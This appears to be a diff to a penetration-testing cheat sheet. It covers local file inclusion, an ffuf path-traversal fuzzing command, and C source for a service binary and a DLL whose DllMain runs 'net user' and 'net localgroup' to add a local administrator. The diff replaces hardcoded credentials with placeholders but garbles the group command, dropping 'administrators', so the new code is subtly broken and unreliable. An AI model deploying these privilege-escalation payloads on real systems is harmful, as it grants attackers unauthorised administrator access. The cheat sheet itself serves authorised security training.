@@ -542,7 +542,6 @@ select * from <<TABLE>>;
 
 ### Local File Inclusion (LFI)
 
-
 Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows.
 
 #### LFI and File Uploads
@@ -715,23 +714,7 @@ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http:
 
 ```
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<<SERVER_IP>>:<<PORT>>/index.php?language=../../../../FUZZ/index.php' -fs <<FILE_SIZE>>
-
-...SNIP...
-
-: Method           : GET
- :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405
- :: Filter           : Response size: 2287
-________________________________________________
-
-/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
 ```
-
 
 ## Directory Traversal
 
@@ -1006,8 +989,8 @@ int main ()
 {
   int i;
   
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
+  i = system ("net user <<USERNAME>> <<PASSWORD>> /add");
+  i = system ("net localgroup <<USERNAME>> <<PASSWORD>> /add");
   
   return 0;
 }
@@ -1088,22 +1071,22 @@ icacls <<SERVICE_BINARY>>
 #include <windows.h>
 
 BOOL APIENTRY DllMain(
-HANDLE hModule,// Handle to DLL module
-DWORD ul_reason_for_call,// Reason for calling function
-LPVOID lpReserved ) // Reserved
+HANDLE hModule,
+DWORD ul_reason_for_call,
+LPVOID lpReserved )
 {
     switch ( ul_reason_for_call )
     {
-        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        case DLL_PROCESS_ATTACH:
         int i;
-  	    i = system ("net user dave2 password123! /add");
-  	    i = system ("net localgroup administrators dave2 /add");
+  	    i = system ("net user <<USERNAME>> <<PASSWORD>> /add");
+  	    i = system ("net localgroup <<USERNAME>> <<PASSWORD>> /add");
         break;
-        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        case DLL_THREAD_ATTACH: 
         break;
-        case DLL_THREAD_DETACH: // A thread exits normally.
+        case DLL_THREAD_DETACH: 
         break;
-        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        case DLL_PROCESS_DETACH:
         break;
     }
     return TRUE;
